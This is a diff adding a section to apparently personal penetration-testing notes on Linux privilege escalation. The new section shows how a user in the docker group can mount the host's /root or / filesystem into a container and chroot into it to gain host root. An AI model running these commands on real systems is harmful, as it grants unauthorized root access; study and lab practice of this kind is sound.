@@ -64,3 +64,24 @@ su root
 ### Weak File Permissions - Writable /etc/passwd
 - The /etc/passwd file contained user password hashes, and some versions of Linux still allow password hashes to be stored there
 - 
+### Docker Linux Local PE
+```
+id
+```
+- Check to see if the user is in the docker group
+```
+docker run hello-world
+```
+- Check to see if docker is installed and working correctly
+```
+docker run -v /root:/mnt alpine cat /mnt/key.txt
+```
+- `-v` specifies a volume to mount, in this case the /root directory on the house was mounted to the /mnt directory on the container.  Because docker has SUID we were able to mount a root owned directory in our container
+```
+docker run -it -v /:/mnt alpine chroot /mnt
+```
+- Roots the host with docker because we used chroot on the /mnt directory.  This allowed us to use the host operating system.
+```
+docker run -it ubuntu bash
+```
+- Optional: Run an ubuntu container with docker
